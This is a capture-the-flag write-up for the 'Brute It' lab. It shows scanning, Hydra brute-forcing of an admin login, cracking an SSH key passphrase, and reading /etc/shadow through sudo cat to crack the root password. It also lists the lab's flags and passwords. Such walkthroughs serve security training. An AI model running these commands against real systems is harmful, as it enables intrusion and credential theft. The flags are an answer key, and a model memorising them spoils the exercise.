# Brute It Write-Up

## Reconnaissance

The first step was confirming the target was alive with a ping, which returned a successful response with a TTL of 62, indicating a Linux host.

```
ping 10.130.164.220
```

From there, an Nmap scan was run to identify open ports and running services:

```
nmap -sC -sV 10.130.164.220
```

The scan revealed two open ports:

- **Port 22** — OpenSSH 7.6p1 (Ubuntu)
- **Port 80** — Apache 2.4.29 (Ubuntu), serving the default Apache page

---

## Web Enumeration

With a web server running, directory brute-forcing was performed using ffuf against the target:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.130.164.220/FUZZ
```

The scan uncovered an `/admin` directory returning a 301 redirect. Navigating to it revealed a login page. Inspecting the page source exposed a developer comment:

```html
<!-- Hey john, if you do not remember, the username is admin -->
```

This confirmed the username as **admin**.

---

## Brute-Forcing the Admin Panel

With the username known, Hydra was used to brute-force the login form using the rockyou wordlist:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.130.164.220 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V
```

Hydra found the credentials: **admin:xavier**

After logging in, the first flag was retrieved:

```
THM{brut3_f0rce_is_e4sy}
```

The admin panel also contained an encrypted RSA private key.

---

## Cracking the RSA Key

The private key was saved locally and converted to a crackable hash using ssh2john:

```
ssh2john rsa > hash.txt
```

John the Ripper was then run against the hash:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The passphrase was cracked as **rockinroll**.

---

## SSH Access as John

Using the RSA key and the cracked passphrase, SSH access was gained as the user **john**:

```
ssh -i rsa john@10.130.164.220
```

The user flag was found in the home directory:

```
THM{a_password_is_not_a_barrier}
```

---

## Privilege Escalation

Checking sudo privileges for john revealed the following:

```
sudo -l
(root) NOPASSWD: /bin/cat
```

John could run `/bin/cat` as root without a password. This was leveraged to read the `/etc/shadow` file and extract the root password hash:

```
sudo /bin/cat /etc/shadow
```

The root hash was saved to a file and cracked with John the Ripper:

```
john --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt
```

The root password was cracked as **football**.

---

## Root Access

Switching to root using the cracked password:

```
su root
```

The root flag was retrieved from `/root/root.txt`:

```
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## Summary

|Step|Detail|
|---|---|
|Open Ports|22 (SSH), 80 (HTTP)|
|Admin Credentials|admin:xavier|
|SSH Passphrase|rockinroll|
|Privilege Escalation|sudo /bin/cat -> /etc/shadow|
|Root Password|football|
|Web Flag|THM{brut3_f0rce_is_e4sy}|
|User Flag|THM{a_password_is_not_a_barrier}|
|Root Flag|THM{pr1v1l3g3_3sc4l4t10n}|